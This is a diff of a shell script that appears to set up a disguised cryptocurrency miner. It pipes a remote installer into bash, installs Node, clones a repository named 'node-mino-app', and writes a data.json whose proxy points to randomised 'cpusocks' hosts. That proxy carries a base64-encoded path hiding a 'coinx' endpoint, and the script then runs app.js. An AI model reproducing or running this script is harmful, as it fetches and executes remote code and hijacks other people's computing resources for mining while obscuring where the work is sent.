@@ -14,6 +14,18 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
+curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh | bash
+sleep 2
+
+# in lieu of restarting the shell
+\. "$HOME/.nvm/nvm.sh"
+
+nvm install 23
+sleep 2
+
+nvm current
+sleep 2
+
 git clone https://github.com/miltoncarpenter665/node-mino-app.git
 sleep 2
 cd node-mino-app
@@ -53,10 +65,6 @@ echo ""
 
 sleep 2
 
-TZ='Africa/Johannesburg'; export TZ
-date
-sleep 2
-
 cat > data.json <<END
 {
   "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbngudGVhdHNwcmF5LnVrOjgyNDM=",
@@ -65,4 +73,4 @@ cat > data.json <<END
 }
 END
 sleep 2
-./node app.js
+node app.js
